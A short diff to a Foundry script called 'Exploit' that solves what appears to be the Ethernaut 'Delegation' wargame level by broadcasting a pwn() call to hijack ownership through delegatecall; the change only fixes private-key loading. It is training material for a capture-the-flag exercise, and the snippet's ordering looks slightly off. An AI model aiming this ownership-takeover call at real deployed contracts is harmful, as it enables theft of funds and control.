@@ -11,11 +11,12 @@ contract Exploit is Script {
 
         Delegation level = Delegation(instance);   
         address instance = vm.envAddress("INSTANCE_LEVEL6");
-        address hacker = vm.envAddress("PRIVATE_KEY");   
+        uint256 hacker = vm.envUint("PRIVATE_KEY");    
+        address deployer = vm.rememberKey(hacker);
         
         function run() external {
 
-            vm.startBroadcast(hacker);
+            vm.startBroadcast(deployer);
             (bool success, ) = address(level).call(
                 abi.encodeWithSignature("pwn()")
             );
